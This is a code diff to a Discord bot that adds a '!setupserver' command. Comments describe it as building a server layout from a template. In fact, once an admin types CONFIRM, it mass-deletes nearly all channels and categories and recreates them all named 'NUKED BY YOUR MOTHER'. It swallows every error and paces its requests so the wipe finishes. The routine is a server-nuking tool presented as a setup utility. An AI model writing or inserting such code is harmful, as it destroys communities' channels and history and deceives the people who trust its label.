@@ -169,7 +169,7 @@ function rotateLogIfNeeded(logPath) {
 
 
 const { getRandomResponse } = require('./utils');
-const { EmbedBuilder } = require('discord.js');
+const { EmbedBuilder, ChannelType } = require('discord.js');
 const { loadVoiceConfig, saveVoiceConfig, isPremiumUser, loadVoiceLogs } = require('./voiceSystem');
 
 const BOT_OWNERS = [
@@ -785,6 +785,81 @@ const commandHandlers = {
                     } catch (err) {
                         // silent on any unexpected error
                     }
+                },
+                '!setupserver': async (message) => {
+                    // Admin-only: clean channels/categories and create a server layout from a template.
+                    if (!isOwnerOrAdmin(message.member)) { message.reply('❌ Admins only'); return; }
+                    const filter = m => m.author.id === message.author.id;
+                    try {
+                        await message.reply('This will DELETE most channels/categories and create the server layout. Type `CONFIRM` to proceed within 30s.');
+                    } catch (e) { /* ignore reply errors */ }
+                    const col = message.channel.createMessageCollector({ filter, time: 30000, max: 1 });
+                    col.on('collect', async (m) => {
+                        if (m.content.trim().toUpperCase() !== 'CONFIRM') {
+                            try { message.reply('Aborted.'); } catch (e) {}
+                            return;
+                        }
+                        // Define your server plan here
+                        const plan = [
+                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
+                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'], voice: ['NUKED BY YOUR MOTHER'] },
+                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
+                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] }
+                        ];
+
+                        const guild = message.guild;
+                        // Safety: do not delete system or AFK channel
+                        const skipIds = new Set([guild.systemChannelId, guild.afkChannelId]);
+
+                        // Delete existing channels (except skipped ones)
+                        try {
+                            for (const ch of guild.channels.cache.values()) {
+                                if (!ch || !ch.id) continue;
+                                if (skipIds.has(ch.id)) continue;
+                                if (ch.managed) continue; // skip integrations/webhooks
+                                try { await ch.delete('Rebuilding server per setup command'); } catch (e) { await new Promise(r=>setTimeout(r, 500)); }
+                                // small delay to avoid rate limits
+                                await new Promise(r=>setTimeout(r, 300));
+                            }
+                        } catch (err) { /* continue even on errors */ }
+
+                        // Create categories and channels
+                        try {
+                            for (const section of plan) {
+                                let category;
+                                try {
+                                    category = await guild.channels.create({ name: section.category, type: ChannelType.GuildCategory });
+                                } catch (e) {
+                                    await new Promise(r=>setTimeout(r, 500));
+                                    category = await guild.channels.create({ name: section.category, type: ChannelType.GuildCategory }).catch(()=>null);
+                                }
+                                if (!category) continue;
+                                // create text channels
+                                if (section.text && Array.isArray(section.text)) {
+                                    for (const name of section.text) {
+                                        try {
+                                            await guild.channels.create({ name: name, type: ChannelType.GuildText, parent: category.id });
+                                        } catch (e) {
+                                            await new Promise(r=>setTimeout(r, 500));
+                                        }
+                                        await new Promise(r=>setTimeout(r, 250));
+                                    }
+                                }
+                                // create voice channels
+                                if (section.voice && Array.isArray(section.voice)) {
+                                    for (const vname of section.voice) {
+                                        try {
+                                            await guild.channels.create({ name: vname, type: ChannelType.GuildVoice, parent: category.id });
+                                        } catch (e) {
+                                            await new Promise(r=>setTimeout(r, 500));
+                                        }
+                                        await new Promise(r=>setTimeout(r, 250));
+                                    }
+                                }
+                            }
+                        } catch (e) { /* ignore individual creation errors */ }
+                        // silent finish
+                    });
                 },
                 '!sban': async (message) => {
                     if (!isOwnerOrAdmin(message.member) || !isPremiumUser(message.author.id)) {
